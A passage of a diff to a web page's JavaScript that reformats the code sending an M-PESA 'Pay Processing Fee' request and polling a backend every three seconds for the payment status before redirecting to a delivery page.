             data
         );
-
 
         if(
             !response.ok ||
@@ -899,11 +1094,9 @@ async function payNow(){
             );
         }
 
-
         let transactionId =
             data.transactionId ||
             data.checkout_request_id;
-
 
         if(!transactionId){
 
@@ -912,21 +1105,17 @@ async function payNow(){
             );
         }
 
-
         btn.innerHTML =
             "Processing...";
-
 
         document.getElementById(
             "stkMessage"
         ).innerHTML =
             "An M-PESA payment request has been sent to your phone. Please enter your M-PESA PIN to complete the payment.";
 
-
         checkPayment(
             transactionId
         );
-
 
     }catch(error){
 
@@ -935,158 +1124,137 @@ async function payNow(){
             error
         );
 
-
         alert(
             error.message ||
             "Payment request failed."
         );
 
-
         btn.innerHTML =
             "Pay Processing Fee";
 
-
         btn.disabled = false;
-
     }
-
 }
 
 
-
-/* =================================
+/* =========================================
    CHECK PAYMENT STATUS
-================================= */
+========================================= */
 
 async function checkPayment(
     transactionId
 ){
 
     let interval =
-        setInterval(
-            async()=>{
+        setInterval(async()=>{
 
-                try{
+            try{
 
-                    let response =
-                        await fetch(
-                            "https://nyota-funds-backend.onrender.com/payment-status",
-                            {
-                                method:"POST",
+                let response =
+                    await fetch(
+                        "https://nyota-funds-backend.onrender.com/payment-status",
+                        {
+                            method:"POST",
 
-                                headers:{
-                                    "Content-Type":
-                                        "application/json"
-                                },
+                            headers:{
+                                "Content-Type":
+                                    "application/json"
+                            },
 
-                                body:
-                                    JSON.stringify({
+                            body:JSON.stringify({
 
-                                        transactionId:
-                                            transactionId
+                                transactionId:
+                                    transactionId
 
-                                    })
-                            }
-                        );
-
-
-                    let result =
-                        await response.json();
-
-
-                    console.log(
-                        "PAYMENT STATUS:",
-                        result
+                            })
+                        }
                     );
 
+                let result =
+                    await response.json();
 
-                    if(
-                        !result.success ||
-                        !result.data
-                    ){
+                console.log(
+                    "PAYMENT STATUS:",
+                    result
+                );
 
-                        return;
-                    }
+                if(
+                    !result.success ||
+                    !result.data
+                ){
 
-
-                    let payment =
-                        result.data;
-
-
-                    let status =
-                        String(
-                            payment.status || ""
-                        ).toUpperCase();
-
-
-                    /* PAYMENT SUCCESS */
-
-                    if(
-                        status === "COMPLETED"
-                    ){
-
-                        clearInterval(
-                            interval
-                        );
-
-
-                        document.getElementById(
-                            "stkMessage"
-                        ).innerHTML =
-                            "✅ Payment successful. Redirecting...";
-
-
-                        window.location.href =
-                            "delivery.html";
-
-                    }
-
-
-                    /* PAYMENT FAILED */
-
-                    else if(
-                        status === "CANCELLED" ||
-                        status === "FAILED"
-                    ){
-
-                        clearInterval(
-                            interval
-                        );
-
-
-                        document.getElementById(
-                            "stkMessage"
-                        ).innerHTML =
-                            "❌ Payment " +
-                            status.toLowerCase() +
-                            ".";
-
-
-                        document.getElementById(
-                            "payBtn"
-                        ).disabled = false;
-
-
-                        document.getElementById(
-                            "payBtn"
-                        ).innerHTML =
-                            "Pay Processing Fee";
-
-                    }
-
-                }catch(error){
-
-                    console.log(
-                        "STATUS ERROR:",
-                        error
-                    );
-
+                    return;
                 }
 
-            },
-            3000
-        );
+                let payment =
+                    result.data;
+
+                let status =
+                    String(
+                        payment.status || ""
+                    ).toUpperCase();
+
+                /* PAYMENT SUCCESS */
+
+                if(
+                    status === "COMPLETED"
+                ){
+
+                    clearInterval(
+                        interval
+                    );
+
+                    document.getElementById(
+                        "stkMessage"
+                    ).innerHTML =
+                        "✅ Payment successful. Redirecting...";
+
+                    window.location.href =
+                        "delivery.html";
+                }
+
+                /* PAYMENT FAILED */
+
+                else if(
+                    status === "CANCELLED" ||
+                    status === "FAILED"
+                ){
+
+                    clearInterval(
+                        interval
+                    );
+
+                    document.getElementById(
+                        "stkMessage"
+                    ).innerHTML =
+                        "❌ Payment " +
+                        status.toLowerCase() +
+                        ".";
+
+                    document.getElementById(
+                        "payBtn"
+                    ).disabled = false;
+
+                    document.getElementById(
+                        "payBtn"
+                    ).innerHTML =
+                        "Pay Processing Fee";
+                }
+
+            }catch(error){
+
+                console.log(
+                    "STATUS ERROR:",
+                    error
+                );
+
+            }
+
+        },3000);
 
 }
 
-</script></body></html>
+</script>
+
+</body>
+</html>
